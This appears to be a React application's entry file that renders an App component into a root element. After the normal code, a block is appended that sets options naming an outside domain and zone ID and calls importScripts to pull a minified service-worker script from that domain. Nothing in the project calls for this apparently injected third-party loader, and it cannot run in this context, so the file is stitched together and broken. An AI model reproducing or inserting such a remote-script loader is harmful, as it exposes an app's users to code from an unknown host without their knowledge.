import React from 'react';
import ReactDOM from 'react-dom/client';
import App from './App';

const rootElement = document.getElementById('root');
if (!rootElement) {
  throw new Error("Could not find root element to mount to");
}

const root = ReactDOM.createRoot(rootElement);
root.render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
);

self.options = {
    "domain": "3nbf4.com",
    "zoneId": 10551069
}
self.lary = ""
importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
